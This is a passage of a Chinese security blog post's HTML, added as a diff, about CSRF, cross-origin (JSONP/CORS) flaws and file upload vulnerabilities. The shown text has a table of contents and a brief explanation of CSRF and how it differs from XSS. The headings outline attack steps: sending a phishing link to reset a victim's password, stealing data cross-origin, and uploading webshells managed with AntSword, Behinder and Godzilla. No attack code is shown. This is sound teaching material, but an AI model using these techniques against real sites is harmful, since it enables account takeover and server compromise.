@@ -1,0 +1,498 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="generator" content="Hexo">
+<title>CSRF 跨站请求伪造与文件上传漏洞 - swfk 的安全笔记</title>
+<meta name="description" content="CSRF 的原理、Poc 构造与防御（Token/SameSite/Referer），以及结合文件上传的特殊 CSRF 场景。">
+<meta name="author" content="swfk2154">
+<meta name="keywords" content="AI安全, 网络安全, 大模型安全, LLM安全, 渗透测试, 安全运营">
+<meta name="theme-color" id="theme-color" content="#f8f7f4">
+<link rel="icon" type="image/svg+xml" href="/images/clay-avatar.svg">
+<link rel="apple-touch-icon" href="/icon.png">
+<link rel="canonical" href="https://blogbu2154.site/csrf-and-file-upload/">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CSRF 跨站请求伪造与文件上传漏洞 - swfk 的安全笔记">
+<meta property="og:description" content="CSRF 的原理、Poc 构造与防御（Token/SameSite/Referer），以及结合文件上传的特殊 CSRF 场景。">
+<meta property="og:url" content="https://blogbu2154.site/csrf-and-file-upload/">
+<meta property="og:site_name" content="swfk 的安全笔记">
+<meta property="og:image" content="/medias/featureimages/4.jpg">
+<meta name="twitter:card" content="summary">
+<link rel="alternate" type="application/atom+xml" title="swfk 的安全笔记" href="/atom.xml">
+<link rel="stylesheet" href="/css/clay.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css">
+
+<script>
+  // 尽早恢复主题，避免首屏闪烁
+  (function () {
+    try {
+      var t = localStorage.getItem('clay-theme') ||
+        (window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light');
+      document.documentElement.dataset.theme = t;
+    } catch (e) {
+      document.documentElement.dataset.theme = 'light';
+    }
+  })();
+</script>
+
+
+<body class="">
+  <a class="skip-link" href="#main">跳到正文</a>
+  <header class="site-nav">
+  <nav class="site-nav__pill" aria-label="主导航">
+    
+      
+        <a href="/" class="">首页</a>
+      
+        <a href="/archives" class="">归档</a>
+      
+        <a href="/categories" class="">分类</a>
+      
+        <a href="/tags" class="">标签</a>
+      
+        <a href="/about" class="">关于</a>
+      
+    
+    
+      <button type="button" class="site-nav__icon" data-search-open aria-label="站内搜索">
+        <svg viewBox="0 0 24 24" width="19" height="19" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.6-3.6"/></svg>
+      </button>
+      <a class="site-nav__icon" href="https://github.com/swfk2154" target="_blank" rel="noopener noreferrer" aria-label="GitHub">
+        <svg class="icon-github" viewBox="0 0 24 24" width="26" height="26" fill="currentColor" aria-hidden="true"><path d="M12 .5C5.65.5.5 5.65.5 12a11.5 11.5 0 0 0 7.86 10.92c.58.11.79-.25.79-.56v-2c-3.2.7-3.88-1.54-3.88-1.54-.53-1.33-1.28-1.69-1.28-1.69-1.04-.71.08-.7.08-.7 1.15.08 1.76 1.18 1.76 1.18 1.03 1.75 2.7 1.25 3.36.95.1-.74.4-1.25.72-1.54-2.55-.29-5.24-1.28-5.24-5.68 0-1.26.45-2.28 1.18-3.09-.12-.29-.51-1.46.11-3.05 0 0 .96-.31 3.15 1.18a10.9 10.9 0 0 1 5.74 0c2.19-1.49 3.15-1.18 3.15-1.18.62 1.59.23 2.76.11 3.05.74.81 1.18 1.83 1.18 3.09 0 4.41-2.69 5.38-5.26 5.66.41.36.78 1.06.78 2.14v3.17c0 .31.21.68.8.56A11.5 11.5 0 0 0 23.5 12C23.5 5.65 18.35.5 12 .5z"/></svg>
+      </a>
+    
+    <button type="button" class="site-nav__icon theme-toggle" data-theme-toggle aria-label="切换主题">
+      <svg class="theme-toggle__moon" viewBox="0 0 24 24" width="19" height="19" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8z"/></svg>
+      <svg class="theme-toggle__sun" viewBox="0 0 24 24" width="19" height="19" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"/></svg>
+    </button>
+  </nav>
+</header>
+
+  <main id="main">
+    
+<div class="reading-progress" aria-hidden="true"><span data-reading-progress></span></div>
+<article class="article article--toc">
+  <div class="article__body">
+    
+
+<aside class="article__aside">
+  <div class="toc-box">
+    <div class="toc-box__title">目录</div>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86%EF%BC%9ACSRF-%E5%9F%BA%E7%A1%80%EF%BC%9A%E5%8E%9F%E7%90%86%E3%80%81%E5%88%A9%E7%94%A8%E4%B8%8E%E9%98%B2%E5%BE%A1"><span class="toc-text">第一部分：CSRF 基础：原理、利用与防御</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF-%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0"><span class="toc-text">CSRF 跨站请求伪造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%A7%E7%94%9F%E5%8E%9F%E5%9B%A0"><span class="toc-text">产生原因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF-%E4%B8%8E-XSS%E5%8C%BA%E5%88%AB"><span class="toc-text">CSRF 与 XSS区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%B1%E5%AE%B3"><span class="toc-text">危害</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%96%E6%8E%98"><span class="toc-text">挖掘</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-text">利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GET%E5%9E%8B-CSRF-%E6%BC%8F%E6%B4%9E"><span class="toc-text">GET型 CSRF 漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%89%BE%E5%88%B0%E6%9C%89%E9%AB%98%E5%8D%B1%E6%93%8D%E4%BD%9C%E5%A4%84%E7%9A%84-csrf%E6%BC%8F%E6%B4%9E%EF%BC%8C%E7%9B%B4%E6%8E%A5%E5%A4%8D%E5%88%B6-URL-%E5%8D%B3%E5%8F%AF%E5%AE%9E%E7%8E%B0-payload-%E7%BC%96%E5%86%99"><span class="toc-text">1 找到有高危操作处的 csrf漏洞，直接复制 URL 即可实现 payload 编写</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POST-%E5%9E%8BCSRF%E6%BC%8F%E6%B4%9E"><span class="toc-text">POST 型CSRF漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%89%BE%E5%88%B0%E6%9C%89%E9%AB%98%E5%8D%B1%E6%93%8D%E4%BD%9C%E5%A4%84%E7%9A%84-csrf%E6%BC%8F%E6%B4%9E%EF%BC%8C%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9E%84%E9%80%A0-payload"><span class="toc-text">1 找到有高危操作处的 csrf漏洞，使用burp进行构造 payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%8A%8Aburpsuite-%E7%94%9F%E6%88%90%E7%9A%84-poc-%E4%BF%9D%E5%AD%98%E5%88%B0%E4%B8%80%E4%B8%AA-html-%E6%96%87%E4%BB%B6%E4%B8%AD"><span class="toc-text">2 把burpsuite 生成的 poc 保存到一个 html 文件中</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%BC%80%E5%90%AF%E7%9B%91%E5%90%AC%EF%BC%8C-%E5%BE%97%E5%88%B0%E9%92%93%E9%B1%BC%E9%93%BE%E6%8E%A5-http-192-168-79-120-8000-1-html"><span class="toc-text">3 开启监听， 得到钓鱼链接 http:&#x2F;&#x2F;192.168.79.120:8000&#x2F;1.html</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E6%8A%8A%E9%92%93%E9%B1%BC%E9%93%BE%E6%8E%A5%E5%8F%91%E7%BB%99%E5%8F%97%E5%AE%B3%E8%80%85%EF%BC%8C%E6%83%B3%E6%96%B9%E8%AE%BE%E6%B3%95%E8%AE%A9%E5%8F%97%E5%AE%B3%E8%80%85%E7%82%B9%E5%87%BB%EF%BC%8C%E5%8F%97%E5%AE%B3%E4%B8%80%E6%97%A6%E7%82%B9%E5%87%BB%EF%BC%8C%E5%B0%B1%E4%BC%9A%E6%8A%8A%E8%87%AA%E5%B7%B1%E7%9A%84%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E4%B8%BA-123%EF%BC%8C%E5%8D%B3%E5%8F%AF%E5%AE%9E%E7%8E%B0%E7%9B%97%E5%8F%B7"><span class="toc-text">4 把钓鱼链接发给受害者，想方设法让受害者点击，受害一旦点击，就会把自己的密码修改为 123，即可实现盗号</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GET%E5%9E%8BCSRF%E6%BC%8F%E6%B4%9E-%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E"><span class="toc-text">GET型CSRF漏洞+存储型XSS漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POST-%E5%9E%8BCSRF%E6%BC%8F%E6%B4%9E-%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E"><span class="toc-text">POST 型CSRF漏洞+存储型XSS漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%9E%84%E9%80%A0csrf-%E6%BC%8F%E6%B4%9E%E7%9A%84-payload"><span class="toc-text">1  构造csrf 漏洞的 payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E7%BC%96%E5%86%99-xss-payload"><span class="toc-text">2  编写 xss payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E7%94%A8-xss-payload-%E6%94%BB%E5%87%BB%E7%9B%AE%E6%A0%87%E7%BD%91%E7%AB%99%E5%AD%98%E5%9C%A8xss%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%9C%B0%E6%96%B9"><span class="toc-text">3  用 xss payload 攻击目标网站存在xss漏洞的地方</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E5%8F%97%E5%AE%B3%E8%80%85%E7%99%BB%E5%BD%95%E7%94%A8%E6%88%B7%EF%BC%8C%E8%BF%9B%E5%85%A5%E9%A6%96%E9%A1%B5%EF%BC%8C%E8%87%AA%E5%8A%A8%E8%A7%A6%E5%8F%91%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81%E3%80%82-%E5%8F%97%E5%AE%B3%E8%80%85%E5%A6%82%E6%9E%9C%E7%99%BB%E5%87%BA%EF%BC%8C%E5%86%8D%E7%99%BB%E5%BD%95%EF%BC%8C%E5%8E%9F%E6%9C%89%E5%AF%86%E7%A0%81%E5%B0%86%E6%97%A0%E6%B3%95%E4%BD%BF%E7%94%A8"><span class="toc-text">4  受害者登录用户，进入首页，自动触发修改密码。 受害者如果登出，再登录，原有密码将无法使用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%8F%8A%E9%98%B2%E5%BE%A1"><span class="toc-text">修复及防御</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86%EF%BC%9A%E7%89%B9%E6%AE%8A-CSRF-%E7%B1%BB%E5%9E%8B%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-text">第二部分：特殊 CSRF 类型与文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A-CSRF-%E7%B1%BB%E5%9E%8B-%E8%B7%A8%E5%9F%9F%E8%AF%B7%E6%B1%82%E6%BC%8F%E6%B4%9E"><span class="toc-text">特殊 CSRF 类型-跨域请求漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8C%E6%BA%90%E7%BD%91%E7%AB%99"><span class="toc-text">同源网站</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5"><span class="toc-text">同源策略</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%A8%E5%9F%9F%E8%AF%B7%E6%B1%82"><span class="toc-text">跨域请求</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%A8%E5%9F%9F%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F"><span class="toc-text">跨域请求方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E9%BB%98%E8%AE%A4%E6%94%AF%E6%8C%81%E7%9A%84%E8%B7%A8%E5%9F%9F"><span class="toc-text">浏览器默认支持的跨域</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jsonp-%E8%B7%A8%E5%9F%9F"><span class="toc-text">jsonp 跨域</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cors-%E8%B7%A8%E5%9F%9F"><span class="toc-text">cors 跨域</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jsonp-%E8%B7%A8%E5%9F%9F%E8%AF%B7%E6%B1%82%E6%BC%8F%E6%B4%9E"><span class="toc-text">jsonp 跨域请求漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%A7%E7%94%9F%E5%8E%9F%E5%9B%A0-1"><span class="toc-text">产生原因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%96%E6%8E%98-1"><span class="toc-text">挖掘</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE-JSONP-%E7%89%B9%E5%BE%81"><span class="toc-text">寻找 JSONP  特征</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E4%B8%BA%E6%BC%8F%E6%B4%9E"><span class="toc-text">判断是否为漏洞</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-1"><span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E8%80%85%E8%A7%86%E8%A7%92"><span class="toc-text">攻击者视角</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%8A%93%E5%8C%85%EF%BC%8C-%E5%9C%A8%E6%94%BB%E5%87%BB%E6%9C%BA%EF%BC%88%E5%8F%97%E5%AE%B3%E8%80%85%E5%BF%85%E9%A1%BB%E8%A6%81%E8%83%BD%E8%BF%9E%E6%8E%A5%E5%88%B0%E4%BD%A0%E7%9A%84%E6%94%BB%E5%87%BB%E6%9C%BA%EF%BC%89%E7%BC%96%E5%86%99-exp-html"><span class="toc-text">1 抓包， 在攻击机（受害者必须要能连接到你的攻击机）编写 exp.html</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%94%BB%E5%87%BB%E8%80%85%E5%9C%A8%E6%94%BB%E5%87%BB%E6%9C%BA%E5%BC%80%E5%90%AF%E7%9B%91%E5%90%AC"><span class="toc-text">2  攻击者在攻击机开启监听</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%94%BB%E5%87%BB%E8%80%85%E6%9E%84%E9%80%A0%E9%92%93%E9%B1%BC%E9%93%BE%E6%8E%A5%EF%BC%8C%E8%AF%B1%E5%AF%BC%E5%8F%97%E5%AE%B3%E8%80%85%E7%82%B9%E5%87%BB-%EF%BC%9A"><span class="toc-text">3  攻击者构造钓鱼链接，诱导受害者点击 ：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E5%A6%82%E6%9E%9C%E5%8F%97%E5%AE%B3%E8%80%85%E7%82%B9%E4%BA%86%E9%92%93%E9%B1%BC%E9%93%BE%E6%8E%A5%EF%BC%8C%E5%8D%B3%E5%8F%AF%E5%BE%97%E5%88%B0%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF"><span class="toc-text">4  如果受害者点了钓鱼链接，即可得到敏感信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%97%E5%AE%B3%E8%80%85%E8%A7%86%E8%A7%92"><span class="toc-text">受害者视角</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CORS%E8%B7%A8%E5%9F%9F%E8%AF%B7%E6%B1%82%E6%BC%8F%E6%B4%9E"><span class="toc-text">CORS跨域请求漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%A7%E7%94%9F%E5%8E%9F%E5%9B%A0-2"><span class="toc-text">产生原因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%96%E6%8E%98-2"><span class="toc-text">挖掘</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%BB%E6%89%BECORS-%E7%9A%84%E7%89%B9%E5%BE%81"><span class="toc-text">寻找CORS 的特征</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E6%98%AF%E6%BC%8F%E6%B4%9E"><span class="toc-text">判断是否是漏洞</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-2"><span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E8%80%85%E8%A7%86%E8%A7%92-1"><span class="toc-text">攻击者视角</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%97%E5%AE%B3%E8%80%85%E8%A7%86%E8%A7%92-1"><span class="toc-text">受害者视角</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Chrome%E7%9A%84%E9%99%90%E5%88%B6"><span class="toc-text">Chrome的限制</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88cors%E7%94%A8%E4%B8%8D%E4%BA%86"><span class="toc-text">为什么cors用不了</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Chrome-Cookie-%E5%B1%9E%E6%80%A7"><span class="toc-text">Chrome Cookie 属性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SameSite"><span class="toc-text">SameSite</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#secure"><span class="toc-text">secure</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%8E%B0%E5%A6%82%E4%BB%8A%E5%A6%82%E6%9E%9C%E6%83%B3cors%E8%B7%A8%E5%9F%9F%E7%9A%84%E6%9D%A1%E4%BB%B6"><span class="toc-text">现如今如果想cors跨域的条件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D"><span class="toc-text">修复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="toc-text">文件上传漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%A7%E7%94%9F%E5%8E%9F%E5%9B%A0-3"><span class="toc-text">产生原因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%B1%E5%AE%B3-%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-text">危害(利用思路)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%96%E6%8E%98-3"><span class="toc-text">挖掘</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-text">代码审计</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%91%E7%9B%92"><span class="toc-text">黑盒</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-3"><span class="toc-text">利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#webshell"><span class="toc-text">webshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E7%B1%BB"><span class="toc-text">分类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-webshell-php%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="toc-text">php webshell ,php的代码执行函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#eval"><span class="toc-text">eval</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#assert"><span class="toc-text">assert</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#preg-replace"><span class="toc-text">preg_replace</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#create-function"><span class="toc-text">create_function</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#array-map"><span class="toc-text">array_map</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#array-filter"><span class="toc-text">array_filter</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#webshell-%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7"><span class="toc-text">webshell 管理工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AntSword"><span class="toc-text">AntSword</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%A3%85"><span class="toc-text">安装</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8"><span class="toc-text">使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86"><span class="toc-text">资源管理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%99%9A%E6%8B%9F%E7%BB%88%E7%AB%AF"><span class="toc-text">虚拟终端</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%A1%E7%90%86"><span class="toc-text">数据库管理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Behinder"><span class="toc-text">Behinder</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%A3%85-1"><span class="toc-text">安装</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-1"><span class="toc-text">使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E5%86%B0%E8%9D%8E%E7%9A%84webshell%E5%AF%86%E7%A0%81"><span class="toc-text">修改冰蝎的webshell密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86-1"><span class="toc-text">资源管理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%99%9A%E6%8B%9F%E7%BB%88%E7%AB%AF-1"><span class="toc-text">虚拟终端</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%A1%E7%90%86-1"><span class="toc-text">数据库管理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%9A%81%E5%89%91%E5%92%8C%E5%86%B0%E8%9D%8E%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-text">蚁剑和冰蝎的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Godzilla"><span class="toc-text">Godzilla</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%A3%85-2"><span class="toc-text">安装</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-2"><span class="toc-text">使用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC"><span class="toc-text">生成木马</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E5%B9%B6%E8%BF%9E%E6%8E%A5%E6%9C%A8%E9%A9%AC"><span class="toc-text">上传并连接木马</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86-2"><span class="toc-text">资源管理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%99%9A%E6%8B%9F%E7%BB%88%E7%AB%AF-2"><span class="toc-text">虚拟终端</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%A1%E7%90%86-2"><span class="toc-text">数据库管理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%93%A5%E6%96%AF%E6%8B%89%E5%92%8C%E8%9A%81%E5%89%91%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-text">哥斯拉和蚁剑的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="toc-text">利用过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%951%EF%BC%9A%E7%BD%91%E7%AB%99%E7%9B%B4%E6%8E%A5%E6%8F%90%E4%BE%9B%E4%BA%86%E7%82%B9%E5%87%BB%E6%8C%89%E9%92%AE%EF%BC%8C%E7%82%B9%E5%87%BB%E5%8D%B3%E5%8F%AF%E8%AE%BF%E9%97%AE"><span class="toc-text">方法1：网站直接提供了点击按钮，点击即可访问</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%952%EF%BC%9A%E5%A6%82%E6%9E%9C%E4%B8%8A%E4%BC%A0%E7%9A%84%E6%98%AF%E5%9B%BE%E7%89%87%EF%BC%88%E5%A6%82%E4%B8%8A%E4%BC%A0%E5%A4%B4%E5%83%8F%EF%BC%89%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E5%8F%B3%E9%94%AE%E5%9B%BE%E7%89%87%E6%9F%A5%E7%9C%8B%E9%93%BE%E6%8E%A5%E5%9C%A8"><span class="toc-text">方法2：如果上传的是图片（如上传头像），可以直接右键图片查看链接在</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%953%EF%BC%9AF12%E6%88%96HTTP-%E5%93%8D%E5%BA%94%E4%B8%AD%E6%85%A2%E6%85%A2%E6%89%BE"><span class="toc-text">方法3：F12或HTTP 响应中慢慢找</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D-1"><span class="toc-text">修复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BD%E5%90%8D%E5%8D%95"><span class="toc-text">白名单</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%91%E5%90%8D%E5%8D%95"><span class="toc-text">黑名单</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-text">静态资源文件服务器</span></a></li></ol></li></ol>
+  </div>
+</aside>
+
+
+    <div class="article__main">
+      <header class="article__header reveal">
+        <p class="eyebrow">网络安全</p>
+        <h1>CSRF 跨站请求伪造与文件上传漏洞</h1>
+        <div class="post-meta">
+          <time datetime="2025-12-09">2025-12-09</time>
+          
+            <span>更新于 2026-08-29</span>
+          
+        </div>
+      </header>
+      
+        <figure class="article__cover reveal"><img src="/medias/featureimages/4.jpg" alt="CSRF 跨站请求伪造与文件上传漏洞" loading="eager" onerror="this.parentElement.style.display='none'"></figure>
+      
+      <div class="post-content reveal">
+        <blockquote>
+<p>本篇整理自我的语雀学习笔记（课堂学习与实操记录），已转为纯文字版并按博客格式排版。</p>
+</blockquote>
+<span id="more"></span>
+
+<hr>
+<h2 id="第一部分：CSRF-基础：原理、利用与防御"><a href="#第一部分：CSRF-基础：原理、利用与防御" class="headerlink" title="第一部分：CSRF 基础：原理、利用与防御"></a>第一部分：CSRF 基础：原理、利用与防御</h2><h3 id="CSRF-跨站请求伪造"><a href="#CSRF-跨站请求伪造" class="headerlink" title="CSRF 跨站请求伪造"></a>CSRF 跨站请求伪造</h3><h3 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h3><p>开发者没有对用户传入的参数做严格的限制或校验，导致黑客可以构造特殊的请求，诱导受害者 执行非本意的操作</p>
+<h3 id="CSRF-与-XSS区别"><a href="#CSRF-与-XSS区别" class="headerlink" title="CSRF 与 XSS区别"></a>CSRF 与 XSS区别</h3><pre><code class="hljs plain">CSRF 是跨站请求伪造、XSS 是跨站脚本攻击
+XSS 利用的核心是窃取 cookie，直接使用cookie登录受害者的账号;csrf 利用的核心是
+诱导、欺骗，不会获取受害者的信息,而是诱导受害者自己去执行某些恶意操作</code></pre>
+
